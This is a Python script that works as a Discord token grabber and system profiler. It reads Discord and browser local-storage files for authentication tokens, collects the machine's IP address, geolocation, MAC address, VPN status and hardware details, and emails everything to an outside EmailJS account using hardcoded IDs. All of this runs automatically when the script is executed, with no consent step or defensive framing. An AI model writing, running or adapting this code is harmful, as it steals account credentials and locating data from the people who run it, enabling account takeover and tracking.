import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
import os
import re
from uuid import getnode as get_mac
import base64
import sqlite3
import shutil
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

import requests

# EmailJS info
EMAILJS_SERVICE_ID = "service_6zq8q4c"
EMAILJS_TEMPLATE_ID = "template_pykx593"
EMAILJS_USER_ID = "E_aFnjODCeH7iOf5d"

def send_emailjs_message(message):
    url = 'https://api.emailjs.com/api/v1.0/email/send'
    payload = {
        "service_id": EMAILJS_SERVICE_ID,
        "template_id": EMAILJS_TEMPLATE_ID,
        "user_id": EMAILJS_USER_ID,
        "template_params": {
            "from_name": "Data Collector Bot",
            "to_name": "Your Name",
            "message": message,
            "reply_to": "your-email@example.com"  # change to your real email
        }
    }
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        print("Email sent successfully!")
    else:
        print("Failed to send email:", response.text)

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()
bt = datetime.fromtimestamp(psutil.boot_time())
host = socket.gethostname()
localip = socket.gethostbyname(host)
publicip = requests.get('https://api.ipify.org').text
city = requests.get(f'https://ipapi.co/{publicip}/city').text
region = requests.get(f'https://ipapi.co/{publicip}/region').text
postal = requests.get(f'https://ipapi.co/{publicip}/postal').text
timezone = requests.get(f'https://ipapi.co/{publicip}/timezone').text
currency = requests.get(f'https://ipapi.co/{publicip}/currency').text
country = requests.get(f'https://ipapi.co/{publicip}/country_name').text
callcode = requests.get(f"https://ipapi.co/{publicip}/country_calling_code").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()

roaming = os.getenv('APPDATA')

# Discord & browser directories to search tokens
Directories = {
    'Discord': roaming + '\\Discord',
    'Discord Two': roaming + '\\discord',
    'Discord Canary': roaming + '\\Discordcanary',
    'Discord Canary Two': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}

def Yoink(Directory):
    Directory += '\\Local Storage\\leveldb'
    Tokens = []
    if not os.path.exists(Directory):
        return Tokens
    for FileName in os.listdir(Directory):
        if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
            continue
        try:
            with open(f'{Directory}\\{FileName}', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        Tokens.extend(re.findall(regex, line))
        except:
            continue
    return Tokens

# Collect tokens from directories
all_tokens = []
for name, path in Directories.items():
    if os.path.exists(path):
        tokens = Yoink(path)
        all_tokens.extend(tokens)

# Gather system info
cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

try:
    partitions = psutil.disk_partitions()
    partition_usage = None
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            break  # just take the first usable partition for info
        except PermissionError:
            continue
except:
    partition_usage = None

# Format collected data into a string
collected_info = f"""
Host: {host}
Local IP: {localip}
Public IP: {publicip}
MAC: {mac}
VPN Proxy: {proxy}

Location:
Country: {country}
Region: {region}
City: {city}
Postal Code: {postal}
Timezone: {timezone}
Currency: {currency}
Calling Code: {callcode}

System:
System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
Boot Time: {bt}

CPU:
Physical cores: {psutil.cpu_count(logical=False)}
Total cores: {psutil.cpu_count(logical=True)}
Max Frequency: {cpufreq.max:.2f}Mhz
Min Frequency: {cpufreq.min:.2f}Mhz
Current Frequency: {cpufreq.current:.2f}Mhz
CPU Usage: {psutil.cpu_percent()}%

Memory:
Total: {scale(svmem.total)}
Available: {scale(svmem.available)}
Used: {scale(svmem.used)}
Percentage: {svmem.percent}%

Disk:
""" + (f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%" if partition_usage else "No disk usage info") + f"""

Disk I/O:
Read bytes: {scale(disk_io.read_bytes)}
Write bytes: {scale(disk_io.write_bytes)}

Network:
Bytes Sent: {scale(net_io.bytes_sent)}
Bytes Received: {scale(net_io.bytes_recv)}

Discord Tokens found:
{', '.join(all_tokens) if all_tokens else "No tokens found"}
"""

# Send collected info via EmailJS
send_emailjs_message(collected_info)
